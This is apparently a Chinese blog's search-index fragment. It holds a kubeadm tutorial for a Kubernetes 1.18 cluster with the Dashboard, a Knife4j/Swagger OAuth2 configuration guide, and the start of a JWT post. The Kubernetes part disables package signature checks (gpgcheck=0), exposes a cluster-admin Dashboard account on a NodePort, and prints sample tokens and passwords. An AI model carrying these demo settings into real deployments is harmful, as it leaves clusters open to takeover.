Kubelet、Kubeadm、Kubectl 1234567891011121314151617# 添加YUm源# vim /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg# 安装（指定版本号，否则默认会安装最新版本）# yum install -y kubelet-1.18.0 kubeadm-1.18.0 kubectl-1.18.0# 开机自启动Kubelet# systemctl enable kubelet# 提示：Kubelet安装完成后不需要手动启动，因为在Node节点成功加入集群之前，Kubelet自身会不断重启（期间会伴随着各种启动错误，这点不用在意） 将桥接的 IPv4 流量传递到 iptables 的链 1234567# 添加路由规则# vim /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1# 配置生效# sysctl --system 设置主机名 1# hostnamectl set-hostname &lt;hostname&gt; 添加 hosts（Master 和各 Node 节点都配置） 123456# 添加hosts# vim /etc/hosts192.168.31.61 k8s-master192.168.31.62 k8s-node1192.168.31.63 k8s-node2192.168.31.64 k8s-node3 部署 Master 节点在 Master 节点执行 Kubeadm 初始化操作，--service-cidr 与 --pod-network-cidr 一般都不需要更改，详细参数说明如下，点击查看详细的安装日志信息 --apiserver-advertise-address：Master 节点的 IP 地址 --kubernetes-version：Kubernetes 的版本号，必须与上面 Kubelet 的版本号一致 --apiserver-advertise-address：一般指定为 Haproxy + Keepalived 的 VIP --image-repository：由于默认拉取镜像地址 k8s.gcr.io 国内无法访问，指定阿里云镜像仓库地址 --pod-network-cidr：指定 Pod Network 的地址范围，由于 Kubernetes 支持多种网络方案，而且不同网络方案对参数有各自要求，设置为 10.244.0.0/16 表示使用 Flannel 网络方案 1234567891011121314151617181920212223242526# 执行初始化# kubeadm init \\--apiserver-advertise-address=192.168.31.61 \\--image-repository registry.aliyuncs.com/google_containers \\--kubernetes-version v1.18.0 \\--service-cidr=10.96.0.0/12 \\--pod-network-cidr=10.244.0.0/16# 当终端打印如下的提示信息，则说明Docker开始拉取镜像，这个过程比较耗时（严重依赖网速）[preflight] Pulling images required for setting up a Kubernetes cluster[preflight] This might take a minute or two, depending on the speed of your internet connection[preflight] You can also perform this action in beforehand using \'kubeadm config images pull\'# 初始化完成后，记录下终端最后打印的Kubeadm命令（如下），后续添加Node节点到集群时会使用到### kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5# 查看Docker的镜像列表# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.aliyuncs.com/google_containers/kube-proxy v1.18.0 43940c34f24f 11 months ago 117MBregistry.aliyuncs.com/google_containers/kube-apiserver v1.18.0 74060cea7f70 11 months ago 173MBregistry.aliyuncs.com/google_containers/kube-controller-manager v1.18.0 d3e55153f52f 11 months ago 162MBregistry.aliyuncs.com/google_containers/kube-scheduler v1.18.0 a31f78c7c8ce 11 months ago 95.3MBregistry.aliyuncs.com/google_containers/pause 3.2 80d28bedfe5d 13 months ago 683kBregistry.aliyuncs.com/google_containers/coredns 1.6.7 67da37a9a360 13 months ago 43.8MBregistry.aliyuncs.com/google_containers/etcd 3.4.3-0 303ce5db0e90 16 months ago 288MB 在 Master 节点配置 Kubectl 工具 1234567891011121314151617# 创建目录# mkdir -p $HOME/.kube# 拷贝配置文件# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config# 文件授权# chown $(id -u):$(id -g) $HOME/.kube/config# 查询组件的状态# kubectl get csNAME STATUS MESSAGEERROR etcd-0 Healthy {"health":"true"}controller-manager Healthy okscheduler Healthy ok# 提示：当上面的 STATUS 结果都为 "Healthy"，表示组件处于健康状态，否则需要检查错误，如果排除不了问题，可以使用 "kubeadm reset" 命令重置集群后重新初始化 Master 节点安装 Flannel 网络插件查看集群状态，此时的 Master 处于 “NotReady”（未就绪），这是因为集群中尚未安装 Flannel 网络插件，部署完网络插件后状态会自动变为 Ready 1234# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master NotReady master 12m v1.18.0 安装 Flannel 网络插件，若 kubectl apply -f 命令执行后提示网络连接失败，可留意文章后面给出的解决方案 12345678910111213141516# 安装Flannel网络插件# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml# 查询Pod组件的状态# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 4m35scoredns-7ff77c879f-xpq9h 1/1 Running 0 4m35setcd-k8s-master 1/1 Running 0 4m44skube-apiserver-k8s-master 1/1 Running 0 4m44skube-controller-manager-k8s-master 1/1 Running 0 4m44skube-flannel-ds-4jtp4 1/1 Running 0 2m36skube-proxy-8bbhk 1/1 Running 0 4m34skube-scheduler-k8s-master 1/1 Running 0 4m44s# 提示：Flannel 网络插件安装完成后，需要耐心等待一段时间，直到 "kubectl get pods -n kube-system" 命令查询到的所有 Pod 组件的状态都为 Running 为止 当 Master 节点处于 Ready 状态，就可以开始将 Node 节点加入集群 1234# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 12m v1.18.0 将 Node 节点加入到 Kubernetes 集群在各个 Node 节点里执行以下命令，向 Kubernetes 集群添加新节点，该命令是上述 kubeadm init 命令执行完成后在终端记录下来的 12# 添加Node节点到集群# kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5 测试 Kubernetes 集群功能在 Master 节点执行以下命令，查看集群中所有节点的状态，当它们的状态都为 Ready 时，表示 Kubernetes 集群已经成功搭建起来了。值得一提的是，集群中所有节点的状态变更为 Ready，这需要花较长时间，可能花十几分钟甚至几十分钟 1234567891011121314151617181920212223242526272829303132# 查看集群状态# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 9m37s v1.18.0k8s-node1 Ready &lt;none&gt; 2m43s v1.18.0k8s-node2 Ready &lt;none&gt; 11s v1.18.0k8s-node3 Ready &lt;none&gt; 1s v1.18.0# 查询Pod组件的状态# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 30mcoredns-7ff77c879f-xpq9h 1/1 Running 0 30metcd-k8s-master 1/1 Running 0 30mkube-apiserver-k8s-master 1/1 Running 0 30mkube-controller-manager-k8s-master 1/1 Running 0 30mkube-flannel-ds-4jtp4 1/1 Running 0 28mkube-flannel-ds-6k8sp 1/1 Running 0 23mkube-flannel-ds-bzwrt 1/1 Running 0 23mkube-flannel-ds-rc8vv 1/1 Running 0 23mkube-proxy-8bbhk 1/1 Running 0 30mkube-proxy-9f96v 1/1 Running 0 23mkube-proxy-9j6qh 1/1 Running 0 23mkube-proxy-bqm7t 1/1 Running 0 23mkube-scheduler-k8s-master 1/1 Running 0 30m# 查看集群版本# kubectl version --shortClient Version: v1.18.0Server Version: v1.18.0# 提示：当各节点的 Linux 系统重启后，Kubernetes 集群里对应的组件会自动启动，不需要人为干预 在 Master 节点里创建一个 Nginx 容器，验证 Kubernetes 集群是否正常运行 123456789101112131415161718# 创建Nginx容器# kubectl create deployment nginx --image=nginx# 暴露Nginx的端口# kubectl expose deployment nginx --port=80 --type=NodePort# 查看Pod组件# kubectl get podNAME READY STATUS RESTARTS AGEpod/nginx-f89759699-59cb7 1/1 Running 0 2m1s# 查看Svc# kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/kubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 48mservice/nginx NodePort 10.102.129.11 &lt;none&gt; 80:32517/TCP 10s# 提示：浏览器访问 "http://&lt;any_node_ip&gt;:32517"，若 Ngninx 容器在集群中创建并启动成功，则默认会打开 Nginx 的首页 Kubeadm 部署 Dashboard 可视化插件在 Kubeadm 部署 Dashboard 可视化插件的流程中，以下所有操作都是直接在 Master 节点里执行，后续不再累述。 Dashboard 简介在 Kubernetes 社区中，有一个很受欢迎的 Dashboard 项目，它可以给用户提供一个可视化的 Web 界面来查看当前集群的各种信息。用户可以用 Kubernetes Dashboard 部署容器化的应用、监控应用的状态、执行故障排查任务以及管理 Kubernetes 各种资源。 Dashboard 官方参考文档 Dashboard Github 项目地址 Dashboard 各版本说明，Dashboard 版本与 Kubernetes 版本必须匹配（兼容） Dashboard 部署执行 YAML 文件直接部署 Dashboard，这里的 Kubernetes 1.8 版本对应的 Dashboard 版本为 v2.0.3，两者的版本号必须匹配 12# 部署# kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml 查看 Dashboard 的运行状态，可以看到以 deployment 方式部署，运行了 2 个 Pod 及 2 个 Service 1234567891011# 查看Pod的状态# kubectl -n kubernetes-dashboard get podsNAME READY STATUS RESTARTS AGEdashboard-metrics-scraper-6b4884c9d5-wn22s 0/1 ContainerCreating 0 48skubernetes-dashboard-7f99b75bf4-fn956 0/1 ContainerCreating 0 48s# 查看Svc的状态# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 117skubernetes-dashboard ClusterIP 10.100.88.170 &lt;none&gt; 443/TCP 117s Dashboard 暴露服务这里作为演示，使用 NodePort 方式将 Dashboard 的服务暴露在集群外，指定使用 30443 端口（可自定义） 12345678# 暴露Service# kubectl patch svc kubernetes-dashboard -n kubernetes-dashboard -p \'{"spec":{"type":"NodePort","ports":[{"port":443,"targetPort":8443,"nodePort":30443}]}}\'# 查看暴露的Service# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 6m2skubernetes-dashboard NodePort 10.100.88.170 &lt;none&gt; 443:30443/TCP 6m2s 或者下载 YAML 文件，手动更改 Service 部分的端口，并以为 NodePort 方式进行部署 1234567891011121314151617181920212223242526# 下载YAML文件# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# 更改YAML文件# vim recommended.yaml---kind: ServiceapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: type: NodePort ports: - port: 443 targetPort: 8443 nodePort: 30443 selector: k8s-app: kubernetes-dashboard---# 更新配置# kubectl apply -f recommended.yaml Dashboard 认证方式登录Dashboard 支持 Kubeconfig 和 Token 两种认证方式，这里选择 Token 认证方式登录，首先执行以下操作创建登录用户 12345# 创建YAML配置文件，复制下面的内容到文件中# vim dashboard-adminuser.yaml# 创建登录用户# kubectl apply -f dashboard-adminuser.yaml YAML 配置文件 dashboard-adminuser.yaml 的完整内容如下，指定了一个名称为 admin-user 的服务账号，并放在 kubernetes-dashboard 命名空间下，并将 cluster-admin 角色绑定到 admin-user 账户，这样 admin-user 账户就有了管理员的权限。默认情况下，Kubeadm 创建集群时已经创建了 cluster-admin 角色，只需直接绑定即可 1234567891011121314151617181920---apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: admin-userroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard 查看 admin-user 账户的 Token 12# 查看Token# kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk \'{print $1}\') 使用火狐浏览器打开 https://&lt;any_node_ip&gt;:30443，访问 Dashboard 的登录界面，由于谷歌浏览器会强制使用 HTTPS 协议，这将导致无法访问 Dashboard 的登录页面，因此建议使用火狐浏览器进行访问 将获取到的 Token 复制到登录界面的 Token 输入框中，成功登陆 Dashboard Dashboard 登录超时Dashboard 默认登录超时时间是 15min，可以为 Dashboard 容器增加 --token-ttl 参数来自定义超时时间，配置示例如下： 123456789101112131415# 下载YAML文件# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# 更改YAML文件# vim recommended.yaml---args: - --auto-generate-certificates - --namespace=kubernetes-dashboard - --token-ttl=43200---# 更新配置# kubectl apply -f recommended.yaml Kubeadm 搭建集群问题总结1[ERROR NumCPU]: the number of available CPUs 1 is less than the required 2 执行 kubeadm init 命令，提示 CPU 核心数少于 2，可以添加命令参数 --ignore-preflight-errors=NumCPU 忽略警告 1[ERROR Swap]: running with swap on is not supported. Please disable swap 执行 kubeadm init 命令，提示启用了 swap 分区，可以添加命令参数 --ignore-preflight-errors \'Swap\' 忽略错误 1[WARNING SystemVerification]: this Docker version is not on the list of validated versions: 19.03.1. Latest validated version: 18.09 执行 kubeadm init 命令，提示 Docker 的版本过高，可能与 Kubernetes 的版本不兼容 1The connection to the server raw.githubusercontent.com was refused - did you specify the right host or port? 执行 kubectl apply -f 命令，提示网络链接失败，这是国内无法访问 raw.githubusercontent.com 导致，临时解决方法如下： 在 https://www.ipaddress.com 网站上查询 raw.githubusercontent.com 域名的真实 IP 地址 更改系统的 /etc/hosts 配置文件，添加一行内容 185.199.108.133 raw.githubusercontent.com，将 185.199.108.133 替换为查询到真实的 IP 地址 重新执行 kubectl apply -f 命令即可 参考资料 Kubernetes 部署 Dashboard 可视化插件 Kubeadm 部署单 Master 节点 Kubernetes 集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Knife4j 基础使用教程",url:"/posts/e2246230.html",text:'1、前言 Knife4j Github 项目 Knife4j 官方示例代码 Knife4j 官方中文文档 - 最新 Knife4j 官方中文文档 - 旧版 特别注意，若没有特别标注说明，本文默认使用的 Knife4j 版本是 2.x。 1.1、Knife4j 简介Knife4j 是为 Java MVC 框架集成 Swagger 生成 Api 文档的增强解决方案，前身是 swagger-bootstrap-ui，致力于 springfox-swagger 的增强 UI 实现。knife4j 为了契合微服务的架构发展，由于原来 swagger-bootstrap-ui 采用的是后端 Java 代码 + 前端 UI 混合打包的方式，在微服务架构下显的很臃肿，因此项目正式更名为 knife4j，更名后主要专注的方面如下： 后端 Java 代码以及前端 UI 模块进行了分离，在微服务架构下使用更加灵活 提供专注于 Swagger 的增强解决方案，不同于只是单纯增强前端 UI 部分 1.2、Knife4j 模块 模块名称 说明 knife4j 为 Java MVC 框架集成 Swagger 的增强解决方案 knife4j-admin 云端 Swagger 接口文档注册管理中心，集成 gateway 网关对任意微服务文档进行组合集成 knife4j-extension chrome 浏览器的增强 swagger 接口文档 ui, 快速渲染 swagger 资源 knife4j-service 为 swagger 服务的一系列接口服务程序 knife4j-front knife4j-spring-ui 的纯前端静态版本，用于集成非 Java 语言使用 swagger-bootstrap-ui knife4j 的前身，最后发布版本是 1.9.6 1.3、使用 Knife4j 的业务场景若不使用 knife4j 的增强功能，相当于纯粹换了一个 Swagger 的前端界面，这种情况是最简单的，原项目结构下无需作任何变更，可以直接引用 swagger-bootstrap-ui 的最后一个版本 1.9.6 或者使用 knife4j-spring-ui 123456&lt;!-- 旧版本引用 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;`swagger-bootstrap-ui`&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt; 123456&lt;!-- 新版本引用 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-ui&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt;&lt;/dependency&gt; 若在 Spring Boot 项目单体架构使用增强功能，knife4j 提供了 starter 供开发者快速使用，该包会引用 knife4j 提供的所有资源，包括前端 UI 和后端的 Jar 包 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 若在 Spring Cloud 的微服务架构下，每个微服务其实并不需要引入前端的 UI 资源，因此在每个微服务的 Spring Boot 项目里，只需引入 knife4j 提供的微服务 starter 即可 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-micro-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 最后在 Spring Cloud 的网关聚合文档服务（如 Zuul、Gateway）里，再把前端的 UI 资源引入 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; 不管是 knife4j 还是 swagger-bootstrap-ui，对外提供的访问地址依然是 http://ip:port/doc.html；同时 swagger-bootstrap-ui 使用的是传统的 Javascript 技术，即 jQuery + DOM 操作，打包后的源码并没有压缩处理，而 knife4j 的前端则采用 Vue。 2、Spring 单体架构2.1、基于 Maven Bom 方式使用 基于 Maven Bom 方式使用 2.2、Spring MVC 框架集成 Knife4j Spring MVC 框架集成 Knife4j 2.3、Spring Boot 框架集成 Knife4j Spring Boot 框架集成 Knife4j 3、Spring Cloud 微服务架构3.1、Spring Cloud Zuul 集成 Knife4j Spring Cloud Zuul 集成 Knife4j 3.2、Spring Cloud Gateway 集成 Knife4j Spring Cloud Gateway 集成 Knife4j 4、微服务聚合实战4.1、Eureka 聚合 Knife4j Eureka 聚合 Knife4j 4.2、Nacos 聚合 Knife4j Nacos 聚合 Knife4j 4.3、Gateway 聚合 Knife4jGateway 聚合 Knife4j 后，若需要对业务模块的的 API 文档接口 /v2/api-doc 添加 Basic 身份认证，则只需在对应的业务模块下的 YML 配置文件里添加以下内容即可： 12345678knife4j: cors: true enable: true # 是否开启增强配置 basic: username: test # Basic认证用户名 password: 987789 # Basic认证密码 enable: true # 开启Basic身份认证 production: false # 是否屏蔽所有Swagger的相关资源，默认是false 若业务模块配置了上述的 Basic 身份认证后，此时访问 Gateway 的聚合文档服务的 Web 界面，会弹出用户名和密码的输入框（如下图） 5、Knife4j 整合 OAuth2.0Knife4j 整合 OAuth2.0 的 Java 代码配置如下，关键在于创建 Docket 对象时，指定 OAuth2.0 的授权模式，包括简化模式 (implicit)、授权码模式 (authorization_code)、密码模式 (password)、客户端模式 (client_credentials)。值得一提的是，无论项目采用 Spring 单体架构还是 Spring Cloud 微服务架构，下面介绍的 Knife4j + OAuth2.0 的整合方式都适用，包括 Gateway + Knife4j + OAuth2.0 整合的项目。 下文提到的 @EnableBeanValidator 注解类的代码如下： 123456789101112import org.springframework.context.annotation.Import;import springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration;import java.lang.annotation.*;@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.TYPE})@Documented@Import(BeanValidatorPluginsConfiguration.class)public @interface EnableBeanValidator {} 手动方式 ★点击展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.service.ApiKey;import springfox.documentation.service.AuthorizationScope;import springfox.documentation.service.SecurityReference;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.Collections;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.basePackage("com.shop")) .paths(PathSelectors.any()) .build() // 整合OAuth2.0 .securitySchemes(Collections.singletonList(apiKey())) .securityContexts(Collections.singletonList(securityContext())); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } private ApiKey apiKey() { return new ApiKey("Bearer", "Authorization", "header"); } /** * Swagger2 认证的安全上下文 * * @return */ private SecurityContext securityContext() { return SecurityContext.builder() .securityReferences(defaultAuth()) .forPaths(PathSelectors.any()) .build(); } /** * 认证方式 * * @return */ private List&lt;SecurityReference&gt; defaultAuth() { AuthorizationScope authorizationScope = new AuthorizationScope("web", "access_token"); AuthorizationScope[] authorizationScopes = new AuthorizationScope[1]; authorizationScopes[0] = authorizationScope; return Collections.singletonList(new SecurityReference("Bearer", authorizationScopes)); }} 最终呈现的界面如下，填写提前获取到的 Access Token 即可，如下图所示： 刷新业务接口的调试界面，就会看到参数 Authorization 值已经更新了，如下图所示： 客户端模式 ★点击展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用客户端模式（client_credentials） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String clientTokenUrl = "http://127.0.0.1:18010/oauth/token"; ClientCredentialsGrant clientCredentialsGrant = new ClientCredentialsGrant(clientTokenUrl); grantTypes.add(clientCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 clientId 以及 clientSecret，然后点击 Authorize 按钮进行授权即可，如下图所示： 密码模式 ★点击展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用密码模式（password） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String passwordTokenUrl = "http://127.0.0.1:18010/oauth/token"; ResourceOwnerPasswordCredentialsGrant resourceOwnerPasswordCredentialsGrant = new ResourceOwnerPasswordCredentialsGrant(passwordTokenUrl); grantTypes.add(resourceOwnerPasswordCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 username、password、clientId 以及 clientSecret，然后点击 Authorize 按钮进行授权即可，如下图所示： 授权模式 ★点击展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j 接口文档") .description("业务接口 API 文档.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 认证的安全上下文 * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 的认证方式 * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // 使用授权码模式（authorization_code） List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); TokenRequestEndpoint tokenRequestEndpoint = new TokenRequestEndpoint("http://127.0.0.1:18010/oauth/authorize", "client1", "secert1"); TokenEndpoint tokenEndpoint = new TokenEndpoint("http://127.0.0.1:18010/oauth/token", "access_token"); AuthorizationCodeGrant authorizationCodeGrant = new AuthorizationCodeGrant(tokenRequestEndpoint, tokenEndpoint); grantTypes.add(authorizationCodeGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} 输入 clientId 及 clientSecret，然后点击 Authorize 按钮，最终跳转授权界面，如下图所示： 选择进行授权，授权完成后就可以直接调试接口了，如下图所示（该图与上述代码不相关，来源于网络）： 简化模式（待补充）6、全局参数设置 Oauth 的 Token除了上面介绍的 Knife4j 自动获取 Access Token 之外，还可以通过 Knife4j 全局参数设置的功能来手动添加 Access Token，可以省去整合 OAuth2.0 的 Java 代码，这里 Access Token 的格式必须是以 bearer + 空格 作为前缀 7、参考文档 Swagger 源码分析 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 java"},{title:"JWT 基础使用教程",url:"/posts/1b9bb05b.html",text:'JWT 概述JSON Web Token（JWT）是目前最流行的跨域身份验证解决方案。 